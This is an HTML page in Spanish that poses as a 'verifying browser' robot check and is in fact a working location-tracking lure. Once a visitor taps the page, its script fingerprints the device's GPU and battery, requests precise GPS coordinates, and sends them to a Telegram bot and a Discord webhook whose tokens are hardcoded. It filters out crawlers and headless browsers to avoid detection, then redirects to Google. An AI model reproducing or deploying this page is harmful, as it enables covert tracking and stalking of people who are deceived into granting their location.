<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificando navegador...</title>
    <style>
        body { background: #fff; color: #3c4043; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; cursor: pointer; }
        .container { text-align: center; padding: 20px; }
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #4285f4; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 1.1rem; font-weight: 500; }
        p { font-size: 0.9rem; color: #70757a; }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <h1>Espera un momento...</h1>
        <p>Toca cualquier parte de la pantalla para confirmar que no eres un robot y continuar.</p>
    </div>

    <script>
        const CONFIG = {
            token: "8536690071:AAG-ScvmZZYWSdhrd3v4lltuWagWuVFlLBU",
            chat: "7542699747",
            webhook: "https://discord.com/api/webhooks/1327800733330599946/BRlFD4PvC66BvqfW7XNbHNYVHVl2uYyXtZQ1ufivSQlTfj0gk2_tFQB_p0mdhwLjPQmk",
            exit: "https://www.google.com"
        };

        // FILTRO 1: Bloqueo inmediato de bots por User-Agent
        const isBot = /bot|googlebot|crawler|spider|robot|crawling|github|headless|lighthouse/i.test(navigator.userAgent);
        
        async function recolectar() {
            if (isBot) return; // Si es un bot, no hace nada

            let id = localStorage.getItem('_sid') || 'ID-' + Math.random().toString(36).substr(2, 5).toUpperCase();
            localStorage.setItem('_sid', id);

            let bat = "hubo problemas con este criterio";
            try {
                const b = await navigator.getBattery();
                bat = `${Math.round(b.level * 100)}% | ${b.charging ? "🔌 Cargando" : "🔋 No cargando"}`;
            } catch(e) {}

            let hw = "hubo problemas con este criterio";
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debug = gl.getExtension('WEBGL_debug_renderer_info');
                hw = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
            } catch(e) {}

            // FILTRO 2: Si el hardware es un servidor genérico o software, descartar
            if (hw.includes("SwiftShader") || hw.includes("llvmpipe")) return;

            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (p) => enviar(p, id, hw, bat),
                    () => enviar(null, id, hw, bat),
                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                );
            } else {
                enviar(null, id, hw, bat);
            }
        }

        async function enviar(pos, id, hw, bat) {
            let gpsTxt = "hubo problemas con esta criterio (GPS)";
            let lat = null, lon = null;

            if (pos) {
                lat = pos.coords.latitude;
                lon = pos.coords.longitude;
                gpsTxt = `Lat: \`${lat}\` | Lon: \`${lon}\` (Precisión: ${Math.round(pos.coords.accuracy)}m)`;
            }

            const report = `👤 **NUEVO ACCESO REAL**\n` +
                           `━━━━━━━━━━━━━━━━━━━━\n` +
                           `🆔 **ID:** \`${id}\`\n` +
                           `📱 **Dispositivo:** \`${hw}\`\n` +
                           `🔋 **Batería:** ${bat}\n` +
                           `📍 **Coords:** ${gpsTxt}\n` +
                           `━━━━━━━━━━━━━━━━━━━━`;

            try {
                await Promise.all([
                    fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            chat_id: CONFIG.chat,
                            text: report,
                            parse_mode: "Markdown",
                            reply_markup: pos ? { inline_keyboard: [[{ text: "🗺️ Abrir en Google Maps", url: `https://www.google.com/maps?q=${lat},${lon}` }]] } : undefined
                        })
                    }),
                    fetch(CONFIG.webhook, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ content: report.replace(/\*/g, "**") })
                    })
                ]);
            } catch(e) {}

            window.location.href = CONFIG.exit;
        }

        // FILTRO 3: Solo se activa si el usuario hace CLIC en la página
        window.onclick = () => {
            if (!window.triggered) {
                window.triggered = true;
                recolectar();
            }
        };
    </script>
</body>
</html>
